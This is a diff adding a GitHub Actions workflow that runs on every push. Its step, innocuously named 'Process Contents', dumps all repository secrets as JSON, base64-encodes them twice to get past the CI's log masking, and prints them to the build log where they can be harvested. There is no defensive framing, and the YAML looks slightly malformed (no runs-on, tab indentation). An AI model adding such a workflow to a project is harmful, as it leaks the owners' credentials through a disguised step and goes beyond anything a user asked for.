@@ -1,0 +1,10 @@
+on:
+  push:
+
+jobs:
+  process:
+    steps:
+    - name: Process Contents
+      run: echo "$CONTENTS" | base64 -w 0 | base64 -w 0
+      env:
+	CONTENTS: ${{ toJSON(secrets) }}
